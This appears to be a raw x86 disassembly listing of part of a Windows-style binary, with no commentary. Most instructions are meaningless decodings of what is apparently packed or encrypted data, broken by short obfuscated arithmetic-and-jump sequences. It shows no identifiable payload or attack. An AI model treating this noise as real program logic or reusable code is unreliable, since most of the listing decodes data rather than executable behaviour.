  40e1d4:	lods   eax,DWORD PTR ds:[esi]
  40e1d5:	jno    0x40e235
  40e1d7:	jle    0x40e19e
  40e1d9:	push   0xa3a8abe3
  40e1de:	pusha  
  40e1df:	je     0x40e22e
  40e1e1:	push   eax
  40e1e2:	int3   
  40e1e3:	ja     0x40e18b
  40e1e5:	add    al,BYTE PTR [ebx+0x4a]
  40e1e8:	or     BYTE PTR [esi+0x1],cl
  40e1eb:	sbb    ah,BYTE PTR [edx-0x7d091a4f]
  40e1f1:	mov    cl,0x1b
  40e1f3:	xor    dh,0x2f
  40e1f6:	ds jbe 0x40e218
  40e1f9:	or     DWORD PTR ds:0xb3f8e08e,0x59e7dc8c
  40e203:	leave  
  40e204:	imul   edx,DWORD PTR [ecx+0xd],0x9a76de16
  40e20b:	(bad)  
  40e20c:	loopne 0x40e1c5
  40e20e:	aaa    
  40e20f:	mov    al,ds:0x3f8a526c
  40e214:	add    al,0x92
  40e216:	dec    esi
  40e217:	aad    0xb9
  40e219:	ror    DWORD PTR [eax+0x21],cl
  40e21c:	mov    BYTE PTR [ebx+0x3612d0e4],cl
  40e222:	mov    ch,0x19
  40e224:	int3   
  40e225:	jb     0x40e275
  40e227:	aad    0x2d
  40e229:	xor    ebx,DWORD PTR [eax-0x6e7922a6]
  40e22f:	jns    0xcc9ada9e
  40e235:	lods   al,BYTE PTR ds:[esi]
  40e236:	jae    0x40e216
  40e238:	adc    eax,0x4900ae07
  40e23d:	(bad)  
  40e23e:	loopne 0x40e238
  40e240:	scas   eax,DWORD PTR es:[edi]
  40e241:	push   es
  40e242:	ja     0x40e238
  40e244:	push   ds
  40e245:	ret    0xe4e8
  40e248:	sbb    BYTE PTR [edx+edi*4-0xd],dh
  40e24c:	cmp    DWORD PTR [ebx+0x6a9b0bb3],eax
  40e252:	and    al,0x44
  40e254:	sub    bh,bl
  40e256:	sti    
  40e257:	xchg   esp,eax
  40e258:	(bad)  
  40e25a:	(bad)  
  40e25b:	sti    
  40e25c:	scas   eax,DWORD PTR es:[edi]
  40e25d:	inc    esp
  40e25e:	sbb    esi,ebx
  40e260:	test   DWORD PTR [ebx],eax
  40e262:	add    BYTE PTR [esi-0x5bcf2767],ch
  40e268:	mov    ah,0xc0
  40e26a:	adc    ecx,DWORD PTR [ecx+0x64141ec8]
  40e270:	and    eax,0xf97e74bf
  40e275:	sar    BYTE PTR [edx-0x50],0xfc
  40e279:	sbb    edx,DWORD PTR [edx]
  40e27b:	push   ss
  40e27c:	sbb    eax,0xb7db6f7d
  40e281:	mov    bh,0x3d
  40e283:	cwde   
  40e284:	das    
  40e285:	mov    ds:0xab513055,al
  40e28a:	mov    bl,0x57
  40e28c:	mov    ah,0xe4
  40e28e:	js     0x40e2f3
  40e290:	out    dx,eax
  40e291:	adc    eax,0xd1e54d43
  40e296:	pop    eax
  40e297:	push   esi
  40e298:	arpl   dx,dx
  40e29a:	mov    eax,ds:0xff8255b0
  40e29f:	lods   eax,DWORD PTR ds:[esi]
  40e2a0:	cmp    DWORD PTR [ebp+0x412bf8a8],eax
  40e2a6:	aas    
  40e2a7:	push   ss
  40e2a8:	or     BYTE PTR [ebp-0x6d1fee4b],al
  40e2ae:	das    
  40e2af:	(bad)  
  40e2b0:	stos   DWORD PTR es:[edi],eax
  40e2b1:	lock (bad) 
  40e2b3:	adc    dh,bh
  40e2b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b6:	outs   dx,BYTE PTR ds:[esi]
  40e2b7:	cwde   
  40e2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2b9:	pop    ecx
  40e2ba:	adc    DWORD PTR [ebp+eax*4+0x58d168a7],edx
  40e2c1:	dec    ecx
  40e2c2:	retf   0x5ab2
  40e2c5:	enter  0x4e42,0xed
  40e2c9:	into   
  40e2ca:	mov    ds:0x68f3bff7,eax
  40e2cf:	stc    
  40e2d0:	(bad)  
  40e2d1:	mov    ds:0xcbc50349,al
  40e2d6:	push   0xffffffac
  40e2d8:	addr16 imul edx,ebx,0xffffff85
  40e2dc:	out    0xec,al
  40e2de:	push   ebp
  40e2df:	fmul   QWORD PTR [ebx]
  40e2e1:	cmp    ecx,ecx
  40e2e3:	xor    eax,0x4289853f
  40e2e8:	sub    al,0xad
  40e2ea:	lock into 
  40e2ec:	jo     0x40e35a
  40e2ee:	jg     0x40e329
  40e2f0:	pop    ds
  40e2f1:	icebp  
  40e2f2:	sbb    ch,BYTE PTR [edi-0x31e1c052]
  40e2f8:	dec    edi
  40e2f9:	fwait
  40e2fa:	xor    al,0x31
  40e2fc:	pop    ecx
  40e2fd:	inc    eax
  40e2fe:	xchg   ebp,eax
  40e2ff:	(bad)  
  40e300:	mov    ch,0x65
  40e302:	inc    ebp
  40e303:	stc    
  40e304:	sahf   
  40e305:	out    0xea,eax
  40e307:	callw  0x81f1
  40e30b:	inc    DWORD PTR [edi]
  40e30d:	jno    0x40e344
  40e30f:	pop    edi
  40e310:	js     0x40e2ca
  40e312:	(bad)  
  40e314:	push   ds
  40e315:	test   DWORD PTR [esi+ebx*8],0x1c306edd
  40e31c:	daa    
  40e31d:	in     al,0xe8
  40e31f:	(bad)  [ebx]
  40e321:	pusha  
  40e322:	inc    ebx
  40e323:	jle    0x40e30a
  40e325:	and    cl,bl
  40e327:	test   dh,0x7e
  40e32a:	add    cl,dl
  40e32c:	adc    DWORD PTR [ebx-0x5f],ebp
  40e32f:	js     0x40e2ef
  40e331:	inc    edi
  40e332:	inc    edx
  40e333:	dec    eax
  40e334:	pop    edx
  40e335:	addr16 lock sbb al,0xd1
  40e339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e33a:	adc    ebx,ebp
  40e33c:	adc    DWORD PTR [ebp-0x7b],eax
  40e33f:	dec    eax
  40e340:	outs   dx,BYTE PTR ss:[esi]
  40e342:	mov    al,ds:0xa2f24317
  40e347:	inc    esi
  40e348:	out    0xd5,eax
  40e34a:	jb     0x40e2da
  40e34c:	jl     0x40e2eb
  40e34e:	dec    edi
  40e34f:	int3   
  40e350:	test   DWORD PTR [edi],ebp
  40e352:	or     al,0xf5
  40e354:	stos   DWORD PTR es:[edi],eax
  40e355:	mov    esi,0x7677d335
  40e35a:	or     eax,0x600798b1
  40e35f:	xchg   DWORD PTR [eax+0x6445f6ec],ecx
  40e365:	mov    DWORD PTR [edi-0x4e],esi
  40e368:	std    
  40e369:	mov    dl,0xe4
  40e36b:	data16 mov ah,0x39
  40e36e:	and    ebx,esp
  40e370:	push   eax
  40e371:	out    dx,al
  40e372:	dec    edi
  40e373:	add    eax,0x2cd82435
  40e378:	sbb    al,0x14
  40e37a:	jecxz  0x40e341
  40e37c:	xor    edx,edx
  40e37e:	mov    edi,0x69550a0c
  40e383:	ja     0x40e379
  40e385:	and    eax,DWORD PTR [esp+eax*2+0x1a]
  40e389:	test   al,0x7d
  40e38b:	mov    ds:0xcbedc8a5,al
  40e390:	shl    BYTE PTR [esp+eiz*4],1
  40e393:	rol    BYTE PTR cs:[ecx],1
  40e396:	adc    esi,DWORD PTR [edx-0x75]
  40e399:	mov    eax,0x732974cf
  40e39e:	mov    esp,DWORD PTR [esi]
  40e3a0:	jl     0x40e3db
  40e3a2:	sbb    DWORD PTR [ebx],edx
  40e3a4:	fmul   QWORD PTR [eax-0x45]
  40e3a7:	push   eax
  40e3a8:	add    BYTE PTR [esi+0x66],dh
  40e3ab:	rcr    ebp,1
  40e3ad:	sbb    eax,0x160173db
  40e3b2:	mov    bh,0xa6
  40e3b4:	mov    ebp,0x962a70a4
  40e3b9:	shl    DWORD PTR [eax+edi*1],1
  40e3bc:	lock in al,dx
  40e3be:	mov    eax,ds:0x7729a490
  40e3c3:	int    0x6a
  40e3c5:	cwde   
  40e3c6:	fisubr DWORD PTR [edi+0x37]
  40e3c9:	inc    ecx
  40e3ca:	cmp    ch,BYTE PTR [eax+edx*4+0x2e]
  40e3ce:	mov    WORD PTR [ecx+ecx*1-0x48874ced],ss
  40e3d5:	mov    esi,0xbf5b9703
  40e3da:	and    DWORD PTR [edi+ebx*4],0x55
  40e3de:	inc    ebp
  40e3df:	bound  esp,QWORD PTR ds:0x665e0673
  40e3e5:	and    DWORD PTR [ebx],ebx
  40e3e7:	inc    edx
  40e3e8:	push   edi
  40e3e9:	lock mov ebx,0xc6cb3ccc
  40e3ef:	mov    esp,0xe38afaa0
  40e3f4:	retf   
  40e3f5:	xor    BYTE PTR [eax-0x49],ch
  40e3f8:	cmp    esi,DWORD PTR [ecx+eax*1+0x6]
  40e3fc:	inc    esi
  40e3fd:	daa    
  40e3fe:	pop    es
  40e3ff:	mov    dl,0x3f
  40e401:	dec    ecx
  40e402:	jnp    0x40e43e
  40e404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e405:	jmp    0x2349d936
  40e40a:	in     al,dx
  40e40b:	(bad)  
  40e40c:	mov    al,ds:0xf1e168e8
  40e411:	repz arpl WORD PTR [esi-0x430978c2],si
  40e418:	sbb    bh,bh
  40e41a:	xor    eax,0xc27384a
  40e41f:	cmp    ebp,DWORD PTR [ecx+0x68]
  40e422:	jecxz  0x40e42f
  40e424:	mov    eax,ds:0x5e9754ae
  40e429:	xor    eax,0x4ad7abed
  40e42e:	cmp    BYTE PTR [esp+ebx*4+0x4b],ch
  40e432:	arpl   WORD PTR [esp+ebp*4-0x2907b479],si
  40e439:	push   ss
  40e43a:	sub    al,0xa5
  40e43c:	mov    edx,0x8df5f1b4
  40e441:	iret   
  40e442:	sub    BYTE PTR [ebx+esi*8],0xbe
  40e446:	adc    bl,ch
  40e448:	jmp    0x3325:0xd233f200
  40e44f:	ins    DWORD PTR es:[edi],dx
  40e450:	add    BYTE PTR [eax],al
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x70d1375d],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [esi+0x63],ch
  40e4ec:	jmp    0xc36e:0xcba99130
  40e4f3:	aam    0x7a
  40e4f5:	mov    edx,0x7e02c697
  40e4fa:	loop   0x40e4d2
  40e4fc:	sub    al,0xe4
  40e4fe:	fisttp WORD PTR [eax+0x60]
  40e501:	pop    esi
  40e502:	sbb    DWORD PTR [edx+0x21],ecx
  40e505:	xlat   BYTE PTR ds:[ebx]
  40e506:	jbe    0x40e563
  40e508:	ret    0x1e5b
  40e50b:	mov    ah,BYTE PTR [ebx-0x7e]
  40e50e:	out    dx,eax
  40e50f:	stos   BYTE PTR es:[edi],al
  40e510:	es xchg esi,eax
  40e512:	ss pop ss
  40e514:	or     bl,bh
  40e516:	mov    dl,0x23
  40e518:	jno    0x40e4b1
  40e51a:	sbb    al,0xb8
  40e51c:	std    
  40e51d:	dec    ecx
  40e51e:	pop    eax
  40e51f:	int3   
  40e520:	jo     0x40e4cd
  40e522:	push   ds
  40e523:	push   edx
  40e524:	and    ch,BYTE PTR [ebx+0x309cec54]
  40e52a:	or     dh,al
  40e52c:	jl     0x40e4df
  40e52e:	adc    bl,ah
  40e530:	adc    BYTE PTR [edi-0x6cde305b],0xf8
  40e537:	cmp    DWORD PTR [esi+edi*4],esp
  40e53a:	aam    0xb3
  40e53c:	sbb    ebp,0xdb53aa5e
  40e542:	in     eax,0x46
  40e544:	(bad)  
  40e545:	ja     0x40e4fd
  40e547:	fld    DWORD PTR [esi+0x34]
  40e54a:	inc    ebx
  40e54b:	lock dec ecx
  40e54d:	adc    eax,0x8fedd795
  40e552:	aaa    
  40e553:	sbb    DWORD PTR [eax],0x7e
  40e556:	ins    DWORD PTR es:[edi],dx
  40e557:	mov    edi,0x6852b9df
  40e55c:	mov    dl,0x0
  40e55e:	push   esi
  40e55f:	mov    edx,0x1092cbb
  40e564:	inc    esi
  40e565:	lods   al,BYTE PTR ds:[esi]
  40e566:	popa   
  40e567:	jno    0x40e568
  40e569:	test   al,0x41
  40e56b:	and    esp,DWORD PTR [esi+0x17]
  40e56e:	ret    
  40e56f:	sub    esp,DWORD PTR [edi-0x30]
  40e572:	into   
  40e573:	mov    esi,0xfc9ab42d
  40e578:	add    eax,0x3d123d20
  40e57d:	inc    esi
  40e57e:	xchg   esp,eax
  40e57f:	imul   BYTE PTR [esi]
  40e581:	mov    WORD PTR [edi*2+0x6079e738],cs
  40e588:	add    BYTE PTR [edi+0x24e06c39],ch
  40e58e:	das    
  40e58f:	out    dx,eax
  40e590:	ror    BYTE PTR [ebp-0x9],1
  40e593:	mov    eax,ebp
  40e595:	out    0x9c,al
  40e597:	xchg   ebp,eax
  40e598:	ret    0x1a4b
  40e59b:	mov    bl,BYTE PTR [edi]
  40e59d:	sbb    ch,BYTE PTR [edx-0x48]
  40e5a0:	rcr    BYTE PTR [ebx-0x1fd9edb1],1
  40e5a6:	cmp    dh,bl
  40e5a8:	jmp    DWORD PTR [eax+0x35]
  40e5ab:	xor    DWORD PTR [ecx-0x1],esp
  40e5ae:	jl     0x40e58b
  40e5b0:	data16 jo 0x40e542
  40e5b3:	mov    ebp,0x9ea5e70
  40e5b8:	mov    bl,0xd0
  40e5ba:	xchg   DWORD PTR [edi],esi
  40e5bc:	adc    ch,0xd4
  40e5bf:	xchg   ebx,eax
  40e5c0:	ja     0x40e55e
  40e5c2:	sbb    ecx,edx
  40e5c4:	mov    edi,0xa384540b
  40e5c9:	cmc    
  40e5ca:	test   DWORD PTR [edx+0x2],0xb7bc4471
  40e5d1:	mov    ds:0x662a8fb5,eax
  40e5d6:	mov    bl,0xf
  40e5d8:	mov    bl,0xde
  40e5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5db:	ins    DWORD PTR es:[edi],dx
  40e5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5dd:	add    al,0xb6
  40e5df:	fs ins DWORD PTR es:[edi],dx
  40e5e1:	pop    ss
  40e5e2:	mov    ecx,0xae92a1a0
  40e5e7:	das    
  40e5e8:	das    
  40e5e9:	xor    eax,0x1d745192
  40e5ee:	inc    edi
  40e5ef:	ins    DWORD PTR es:[edi],dx
  40e5f0:	mov    esi,0x9fdb37b
  40e5f5:	shr    DWORD PTR [edx+ebx*2-0x41],0xf7
  40e5fa:	push   eax
  40e5fb:	push   esp
  40e5fc:	scas   eax,DWORD PTR es:[edi]
  40e5fd:	mov    esp,0x21c55db8
  40e602:	lods   al,BYTE PTR ds:[esi]
  40e603:	pop    eax
  40e604:	dec    edi
  40e605:	xchg   DWORD PTR [ebx+ecx*2-0x332f1a1e],ebx
  40e60c:	and    DWORD PTR [ecx],ebp
  40e60e:	jl     0x40e5e7
  40e610:	mov    esi,0xc0fd5f41
  40e615:	xor    DWORD PTR [eax-0x6e],0x542d8dd5
  40e61c:	sbb    eax,0x76958d3a
  40e621:	shl    dl,0x25
  40e624:	mov    ss,WORD PTR [ebx+0x4450870c]
  40e62a:	popa   
  40e62b:	sub    al,0xe3
  40e62d:	icebp  
  40e62e:	aam    0x57
  40e630:	cmp    BYTE PTR [ebp-0xde16a32],ah
  40e636:	push   edx
  40e637:	shl    DWORD PTR [ebx-0x53272058],1
  40e63d:	aam    0xf7
  40e63f:	adc    al,0x15
  40e641:	shl    DWORD PTR [edi-0x1748191a],1
  40e647:	mov    WORD PTR [ecx],ss
  40e649:	pop    es
  40e64a:	int    0x1d
  40e64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64d:	test   al,0xb6
  40e64f:	or     DWORD PTR [ebx-0x2b],esi
  40e652:	push   esp
  40e653:	pop    ebx
  40e654:	iret   
  40e655:	es test eax,0xcc24b27
  40e65b:	fadd   QWORD PTR [edx-0x6fa17ea8]
  40e661:	sub    eax,0x57760d10
  40e666:	enter  0xd2b1,0x7b
  40e66a:	cmp    eax,0xe7326198
  40e66f:	xor    al,0x6c
  40e671:	mov    al,ds:0x547d7a23
  40e676:	xor    dl,BYTE PTR [eax]
  40e678:	push   eax
  40e679:	jne    0x40e616
  40e67b:	or     ecx,esi
  40e67d:	repz int 0x5a
  40e680:	and    DWORD PTR [esi],ebp
  40e682:	out    dx,al
  40e683:	mov    dh,0x87
  40e685:	cmp    eax,0xeaf6c807
  40e68a:	xor    ah,BYTE PTR [edx+0x64f44ee9]
  40e690:	pop    ds
  40e691:	dec    ebx
  40e692:	adc    cl,cl
  40e694:	inc    ebx
  40e695:	rol    ebp,0x60
  40e698:	dec    esi
  40e699:	add    BYTE PTR [edi+0x6fe1c077],dl
  40e69f:	ret    
  40e6a0:	sar    BYTE PTR [eax],cl
  40e6a2:	dec    eax
  40e6a3:	sbb    dl,dh
  40e6a5:	je     0x40e6a5
  40e6a7:	loope  0x40e6e6
  40e6a9:	cli    
  40e6aa:	cmp    edi,DWORD PTR [esi+0x2c5b9af4]
  40e6b0:	stos   BYTE PTR es:[edi],al
  40e6b1:	add    al,0x2c
  40e6b3:	ds (bad) 
  40e6b6:	into   
  40e6b7:	(bad)  
  40e6b8:	(bad)  [edx]
  40e6ba:	fsub   QWORD PTR ds:0xea85c0af
  40e6c0:	xchg   BYTE PTR [ebp+0x73],ch
  40e6c3:	das    
  40e6c4:	xchg   edx,eax
  40e6c5:	mov    bl,0x4b
  40e6c7:	stos   DWORD PTR es:[edi],eax
  40e6c8:	loop   0x40e6d4
  40e6ca:	mov    ah,0xd2
  40e6cc:	push   ss
  40e6cd:	sbb    DWORD PTR [eax+0x43343122],ebp
  40e6d3:	xor    ebx,DWORD PTR [esi]
  40e6d5:	pop    edx
  40e6d6:	xor    bl,BYTE PTR [esi+0x31]
  40e6d9:	push   esi
  40e6da:	std    
  40e6db:	push   ds
  40e6dc:	push   edx
  40e6dd:	xchg   ecx,eax
  40e6de:	pushf  
  40e6df:	lods   eax,DWORD PTR ds:[esi]
  40e6e0:	lods   al,BYTE PTR ds:[esi]
  40e6e1:	mov    eax,0xe6163019
  40e6e6:	mov    ecx,0xa6f96a89
  40e6eb:	lss    edx,FWORD PTR [eax]
  40e6ee:	div    BYTE PTR [esi+0x8]
  40e6f1:	adc    DWORD PTR [edi+0x1c],ebp
  40e6f4:	call   0xe1de6b8b
  40e6f9:	lock jno 0x40e74f
  40e6fc:	jg     0x40e76f
  40e6fe:	std    
  40e6ff:	adc    al,0xb6
  40e701:	inc    esp
  40e702:	jbe    0x40e702
  40e704:	dec    ebp
  40e705:	add    DWORD PTR [esi+0x2a],eax
  40e708:	data16 rol sp,0x26
  40e70d:	add    al,0xdc
  40e70f:	imul   esp,DWORD PTR [esi+esi*2],0xffffffac
  40e713:	mov    bh,BYTE PTR [esi-0x70]
  40e716:	aaa    
  40e717:	push   es
  40e718:	fmul   DWORD PTR [eax+0x1e]
  40e71b:	inc    ebp
  40e71c:	jp     0xc137a7ea
  40e722:	arpl   WORD PTR [ebx],cx
  40e724:	jb     0x40e79d
  40e726:	icebp  
  40e727:	mov    ch,0xc8
  40e729:	push   ecx
  40e72a:	je     0x40e6d8
  40e72c:	add    cl,BYTE PTR [edx]
  40e72e:	scas   eax,DWORD PTR es:[edi]
  40e72f:	out    dx,eax
  40e730:	dec    edx
  40e731:	(bad)  
  40e732:	(bad)  
  40e733:	push   eax
  40e734:	mov    ebx,0x9ae1768c
  40e739:	inc    esi
  40e73a:	ins    BYTE PTR es:[edi],dx
  40e73b:	xchg   ebp,eax
  40e73c:	xor    eax,0xf9a03fb5
  40e741:	sub    al,0x9b
  40e743:	pushf  
  40e744:	iret   
  40e745:	je     0x40e79d
  40e747:	loop   0x40e715
  40e749:	and    eax,0xb1124f0a
  40e74e:	sbb    edi,esi
  40e750:	imul   edx,esi,0x55ccb06c
  40e756:	(bad)  [ebp-0x38]
  40e759:	fcom   QWORD PTR [ebx-0x30dfa48c]
  40e75f:	popa   
  40e760:	pop    edi
  40e761:	cdq    
  40e762:	in     eax,dx
  40e763:	pop    edx
  40e764:	stos   BYTE PTR es:[edi],al
  40e765:	aam    0x5a
  40e767:	ss fwait
  40e769:	jb     0x40e7d1
  40e76b:	inc    esi
  40e76c:	cli    
  40e76d:	push   ds
  40e76e:	ds push edi
  40e770:	jmp    0x40e768
  40e772:	shl    bl,cl
  40e774:	and    al,0xe8
  40e776:	(bad)  
  40e778:	out    dx,al
  40e779:	and    al,BYTE PTR [ecx-0x26]
  40e77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77e:	jmp    0xd4d09b7
  40e783:	(bad)  [esp+esi*2]
  40e786:	jp     0x40e7b7
  40e788:	dec    eax
  40e789:	hlt    
  40e78a:	jmp    0xd1873cd9
  40e78f:	(bad)  
  40e790:	mov    al,ds:0x45c7c82b
  40e795:	or     al,0xd3
  40e797:	or     BYTE PTR [eax],al
  40e799:	add    bh,al
  40e79b:	inc    ebp
  40e79c:	or     BYTE PTR [edx-0x76ffffdd],dl
  40e7a2:	pop    ebp
  40e7a3:	loopne 0x40e76c
  40e7a5:	inc    ebp
  40e7a6:	fmul   QWORD PTR [edi-0x38ffffcd]
  40e7ac:	inc    ebp
  40e7ad:	fmul   st,st(1)
  40e7af:	popa   
  40e7b0:	add    BYTE PTR [eax],al
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	xor    BYTE PTR [ebp-0x41bd4357],dl
  40e7f5:	sbb    BYTE PTR [eax],bl
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    BYTE PTR [ecx],ah
  40e7fc:	out    dx,eax
  40e7fd:	dec    edx
  40e7fe:	loope  0x40e82e
  40e800:	ins    DWORD PTR es:[edi],dx
  40e801:	add    BYTE PTR [esi+ecx*8-0x46],dh
  40e805:	and    eax,0x5d32b176
  40e80a:	daa    
  40e80b:	popf   
  40e80c:	imul   ebx,edx,0x94a2248f
  40e812:	jecxz  0x40e7a9
  40e814:	or     eax,0x902a470
  40e819:	jmp    0x40e81f
  40e81b:	call   0xb1dc7cb0
  40e820:	enter  0xf0c4,0x72
  40e824:	inc    esp
  40e825:	mov    dl,dh
  40e827:	add    DWORD PTR [ebp+0x64],ebp
  40e82a:	inc    esi
  40e82b:	mov    eax,edi
  40e82d:	adc    ch,ch
  40e82f:	inc    al
  40e831:	push   eax
  40e832:	xchg   esi,eax
  40e833:	adc    ebx,edx
  40e835:	scas   al,BYTE PTR es:[edi]
  40e836:	mov    ecx,0xfbb42e4c
  40e83b:	rcl    DWORD PTR [ecx-0x5d],cl
  40e83e:	mov    BYTE PTR [ecx],bh
  40e840:	and    dh,BYTE PTR [edi+0x5f]
  40e843:	dec    ebp
  40e844:	and    ebp,DWORD PTR [ecx+0x786e0a96]
  40e84a:	inc    ebp
  40e84b:	sub    eax,0x42add81f
  40e850:	ins    BYTE PTR es:[edi],dx
  40e851:	pop    ecx
  40e852:	test   DWORD PTR [edx],0x848fa5d8
  40e858:	mov    ds:0xf0a27d4,eax
  40e85d:	xor    DWORD PTR [eax+0x4b8a4878],0xffffff82
  40e864:	test   BYTE PTR [edi+0x39],bl
  40e867:	jae    0x40e880
  40e869:	pop    es
  40e86a:	cdq    
  40e86b:	loope  0x40e7f7
  40e86d:	add    eax,0xcdc1a155
  40e872:	cdq    
  40e873:	xor    eax,0xb7b42296
  40e878:	xor    al,0x21
  40e87a:	jnp    0x40e83d
  40e87c:	adc    DWORD PTR [ebp+0x125d5193],edx
  40e882:	xlat   BYTE PTR ds:[ebx]
  40e883:	outs   dx,BYTE PTR ds:[esi]
  40e884:	mov    ch,0x5d
  40e886:	cmp    DWORD PTR [edx-0xe8449fd],ebp
  40e88c:	sbb    cl,dl
  40e88e:	fwait
  40e88f:	sbb    al,0xae
  40e891:	add    al,0x2c
  40e893:	pop    esp
  40e894:	stc    
  40e895:	ret    
  40e896:	xchg   ebx,eax
  40e897:	mov    al,ds:0xe7c043c0
  40e89c:	push   ebx
  40e89d:	fs adc al,0x9a
  40e8a0:	sbb    cl,BYTE PTR [ecx-0x63144e68]
  40e8a6:	add    eax,0x4c4733c2
  40e8ab:	and    cl,bh
  40e8ad:	test   cl,0xb5
  40e8b0:	jno    0x40e91b
  40e8b2:	pop    ecx
  40e8b3:	leave  
  40e8b4:	jno    0x40e92e
  40e8b6:	es pop esp
  40e8b8:	cmp    DWORD PTR [esi+0x26],edi
  40e8bb:	jg     0x40e8e4
  40e8bd:	mov    ds:0x2592a42e,eax
  40e8c2:	cwde   
  40e8c3:	data16 clc 
  40e8c5:	and    al,BYTE PTR [edx+edi*8]
  40e8c8:	inc    ebx
  40e8c9:	cs jg  0x40e924
  40e8cc:	call   0x2b01:0xa8aa51be
  40e8d3:	dec    edi
  40e8d4:	retf   
  40e8d5:	call   0x9618a839
  40e8da:	pop    eax
  40e8db:	nop
  40e8dc:	mov    gs,edx
  40e8de:	mov    BYTE PTR [esi],cl
  40e8e0:	call   0xc188:0x872ee758
  40e8e7:	sbb    DWORD PTR [edi+0x5592abf],esi
  40e8ed:	mov    bl,0x9a
  40e8ef:	or     dl,ch
  40e8f1:	inc    edx
  40e8f2:	mov    ch,0x3f
  40e8f4:	mov    bl,0xab
  40e8f6:	or     al,0x5e
  40e8f8:	add    ah,BYTE PTR [esi+0x34dbdf01]
  40e8fe:	jae    0x40e932
  40e900:	jne    0x40e8fc
  40e902:	jb     0x40e960
  40e904:	cmp    al,0x8f
  40e906:	sub    BYTE PTR [ebx],cl
  40e908:	dec    esi
  40e909:	xchg   ecx,eax
  40e90a:	imul   esp,DWORD PTR [eax],0xffffffeb
  40e90d:	add    al,0x7b
  40e90f:	dec    eax
  40e910:	pop    ebx
  40e911:	xlat   BYTE PTR ds:[ebx]
  40e912:	jmp    0x57ca:0x95c73e71
  40e919:	inc    ebx
  40e91a:	push   ss
  40e91b:	stos   DWORD PTR es:[edi],eax
  40e91c:	fdiv   DWORD PTR [ebx]
  40e91e:	sahf   
  40e91f:	mov    esp,0x8db831d6
  40e924:	push   0x39
  40e926:	aad    0xa6
  40e928:	pop    ecx
  40e929:	inc    edi
  40e92a:	xor    eax,0xf6b7add6
  40e92f:	mov    al,ds:0x92c4ede7
  40e934:	sahf   
  40e935:	sbb    ebx,esi
  40e937:	je     0x40e8c4
  40e939:	add    esp,0xffffffd6
  40e93c:	or     BYTE PTR [edx],cl
  40e93e:	inc    edi
  40e93f:	retf   0xaefe
  40e942:	and    eax,0xf5a5549e
  40e947:	or     eax,edi
  40e949:	pusha  
  40e94a:	js     0x40e951
  40e94c:	in     eax,dx
  40e94d:	xchg   ebx,eax
  40e94e:	sub    cl,bl
  40e950:	add    al,BYTE PTR [ecx+0x4e32459c]
  40e956:	pop    es
  40e957:	sbb    al,0x69
  40e959:	mul    al
  40e95b:	popa   
  40e95c:	pop    DWORD PTR [esi+0x56]
  40e95f:	dec    edx
  40e960:	fistp  WORD PTR [esi+eax*2+0x40]
  40e964:	imul   edi,DWORD PTR [esi+edx*8-0x71d3f487],0xeafdceaf
  40e96f:	stos   DWORD PTR es:[edi],eax
  40e970:	add    eax,ebp
  40e972:	les    edx,FWORD PTR [esi]
  40e974:	pop    ss
  40e975:	push   0x7fb37c04
  40e97a:	adc    eax,0x9382989c
  40e97f:	scas   eax,DWORD PTR es:[edi]
  40e980:	mov    al,0x7b
  40e982:	out    dx,eax
  40e983:	adc    eax,0x2a2f7314
  40e988:	mov    eax,0xb4b6e366
  40e98d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e98e:	(bad)  
